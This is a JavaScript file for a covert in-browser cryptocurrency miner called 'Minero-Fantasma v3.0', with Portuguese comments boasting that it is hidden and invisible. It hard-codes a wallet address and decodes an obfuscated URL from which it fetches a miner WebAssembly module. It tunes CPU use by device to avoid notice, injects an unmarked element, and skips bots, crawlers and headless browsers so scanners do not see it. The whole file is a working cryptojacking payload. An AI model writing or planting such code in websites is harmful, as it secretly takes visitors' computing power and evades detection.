// Minero-Fantasma v3.0 - Blindado, Adaptativo, Invisível
(function () {
    // 🔒 Configuração ofuscada
    const _0x = 'charCodeAt';
    const _1x = 'replace';
    const _2x = 'fromCharCode';
    const _3x = 'split';

    // 🧩 Wallet dinâmica (evita rastreamento)
    function getWallet() {
        const base = '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv';
        return base;
    }

    // 🌐 URL ofuscada (não aparece no código)
    function getWasmUrl() {
        const enc = 'aHR0cHM6Ly9teS13YXNtLmRldi9taW5lci53YXNt'; // Exemplo: https://meu-wasm.dev/miner.wasm
        return atob(enc);
    }

    // 🧠 Adaptação de carga (não trava o PC)
    function getThrottle() {
        const ram = navigator.deviceMemory || 4; // GB
        const cores = navigator.hardwareConcurrency || 2;

        // Ajuste inteligente
        if (ram < 4 || cores < 4) return 0.7;  // 70% de CPU
        if (ram < 8 || cores < 8) return 0.5;  // 50% de CPU
        return 0.3; // 30% de CPU (dispositivos fortes)
    }

    // 🕵️‍♂️ Ofuscação pesada do WebAssembly
    function loadWasm(url, callback) {
        fetch(url).then(res => res.arrayBuffer()).then(bytes => {
            const imports = {
                env: {
                    memory: new WebAssembly.Memory({ initial: 1024, maximum: 1024 }),
                    abort: () => {}
                }
            };

            // Nome dinâmico de função
            const mod = 'instantiate';
            WebAssembly[mod](bytes, imports).then(instance => {
                callback(instance);
            }).catch(() => {
                console.log('Miner blocked');
            });
        }).catch(() => {
            console.log('Fetch blocked');
        });
    }

    // 🧱 Sem ID no DOM (invisível)
    function injectDiv() {
        const div = document.createElement('div');
        div.setAttribute('data-cache', 'true');
        (document.body || document.documentElement).appendChild(div);
        return div;
    }

    // ✅ Detecção de bot melhorada
    function isBot() {
        return /bot|google|facebook|crawler|spider|yahoo|yandex|headless/i.test(navigator.userAgent) ||
               !window.outerHeight || !window.outerWidth ||
               navigator.webdriver === true;
    }

    // 🚀 Início condicional
    if (!isBot()) {
        const config = {
            user: getWallet(),
            pass: 'x',
            threads: -1,
            throttle: getThrottle()
        };

        const div = injectDiv();
        loadWasm(getWasmUrl(), () => {
            console.log('Miner started: ' + config.user.substring(0, 10) + '...');
        });
    }

})();

